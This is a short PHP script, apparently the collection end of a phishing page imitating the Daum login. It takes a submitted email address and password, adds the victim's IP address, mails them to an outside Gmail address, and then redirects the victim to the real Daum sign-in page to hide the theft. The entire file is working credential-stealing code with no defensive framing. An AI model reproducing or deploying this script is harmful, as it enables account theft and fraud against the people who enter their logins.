<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ourtime || :------\n";
$message .= "Email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="justonelooking7@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://logins.daum.net/accounts/signinform.do?url=https%3A%2F%2Fwww.daum.net%2F&fbclid=IwAR06k74HZC6Yg1c2G6U0S1xM3iDEsb4YxYmcfVgEfz_wUISfn_4jF7qz1LI");
?>